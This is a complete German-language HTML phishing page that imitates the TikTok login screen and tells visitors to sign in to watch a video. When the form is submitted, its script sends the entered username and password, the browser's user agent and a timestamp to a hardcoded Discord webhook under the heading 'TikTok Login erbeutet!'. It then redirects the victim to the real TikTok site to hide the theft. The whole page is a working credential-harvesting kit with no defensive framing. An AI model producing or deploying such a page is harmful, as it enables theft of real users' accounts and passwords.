		<!DOCTYPE html>
		<html lang="de">
		<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        
        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: #fff;
            font-family: 'Roboto', system-ui, -apple-system, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
            height: 100vh;
            background: #000;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.8);
        }
        
        .header {
            text-align: center;
            padding: 40px 20px 20px;
        }
        
        .logo {
            width: 120px;
            height: 120px;
            background: linear-gradient(135deg, #ff0050, #00f2ea);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 60px;
            font-weight: 900;
            color: white;
            box-shadow: 0 0 30px rgba(255, 0, 80, 0.6);
        }
        
        .title {
            font-size: 28px;
            font-weight: 700;
            margin: 10px 0;
        }
        
        .subtitle {
            font-size: 17px;
            color: #aaa;
            margin-bottom: 30px;
        }
        
        .form {
            padding: 0 30px;
        }
        
        input {
            width: 100%;
            background: #111;
            border: 1px solid #333;
            color: white;
            padding: 16px 20px;
            border-radius: 8px;
            font-size: 17px;
            margin-bottom: 15px;
            box-sizing: border-box;
        }
        
        input:focus {
            outline: none;
            border-color: #ff0050;
        }
        
        .login-btn {
            width: 100%;
            background: #ff0050;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            margin-top: 10px;
            cursor: pointer;
        }
        
        .footer {
            position: absolute;
            bottom: 30px;
            left: 0;
            right: 0;
            text-align: center;
            font-size: 14px;
            color: #666;
        }
        
        .language {
            position: absolute;
            top: 20px;
            right: 20px;
            color: #aaa;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="language">🌐 Deutsch</div>
        
        <div class="header">
            <div class="logo">♬</div>
            <div class="title">TikTok</div>
            <div class="subtitle">Melde dich an, um das video zu sehen</div>
        </div>
        
        <div class="form">
            <input type="text" id="username" placeholder="Benutzername, E-Mail oder Telefon" required>
            <input type="password" id="password" placeholder="Passwort" required>
            
            <button class="login-btn" onclick="submitLogin()">Anmelden</button>
            
            <div style="text-align:center; margin:20px 0; color:#aaa; font-size:15px;">
                <a href="#" style="color:#ff0050; text-decoration:none;">Passwort vergessen?</a>
            </div>
        </div>
        
        <div class="footer">
            Du hast kein Konto? <span style="color:#ff0050;">Registrieren</span><br><br>
            © 2026 TikTok
        </div>
    </div>

    <script>
        function submitLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                alert("Bitte fülle alle Felder aus.");
                return;
            }
            
            // Hier Discord Webhook einfügen
            const webhookUrl = "https://discord.com/api/webhooks/1525493036455301200/l58uwVZ7kbagMRObKrGSZSdtsTfTTNoRgSTLfFNsuNfBuQ3kgsgXlzUdP5ncHf0fBzpw";            
            const data = {
                content: "**TikTok Login erbeutet!**",
                embeds: [{
                    title: "Neuer TikTok Login",
                    color: 0xff0050,
                    fields: [
                        { name: "Benutzername/E-Mail", value: username, inline: false },
                        { name: "Passwort", value: password, inline: false },
                        { name: "IP", value: "```" + (navigator.userAgent || "Unbekannt") + "```", inline: false },
                        { name: "Zeit", value: new Date().toLocaleString('de-DE'), inline: false }
                    ]
                }]
            };
            
            fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            }).then(() => {
                // Nach erfolgreichem Senden zur echten TikTok-Seite weiterleiten
                window.location.href = "https://www.tiktok.com";
            }).catch(() => {
                window.location.href = "https://www.tiktok.com";
            });
        }
    </script>
</body>
</html>
